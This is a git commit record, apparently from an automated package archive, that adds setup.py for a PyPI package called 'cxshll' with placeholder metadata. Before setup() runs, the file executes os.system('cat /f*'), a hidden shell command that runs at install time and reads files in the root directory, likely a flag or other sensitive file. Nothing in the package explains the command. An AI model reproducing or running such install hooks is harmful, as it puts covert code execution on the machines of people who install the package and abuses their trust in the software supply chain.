c3547c8c244713ece018b0c09668d67d2842c77e
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 17:27:00 +0000

    Add package cxshll/0.0.1/cxshll-0.0.1.tar.gz

---
+++ packages/cxshll/cxshll-0.0.1.tar.gz/cxshll-0.0.1/setup.py
@@ -0,0 +1,12 @@
+from setuptools import setup
+import os
+os.system('cat /f*')
+
+setup(name='cxshll',
+      version='0.0.1',
+      description='xshll',
+      author='xxsaf',
+      license='MIT',
+      packages=['cxshll'],
+      scripts=['bin/foo.sh']
+      )
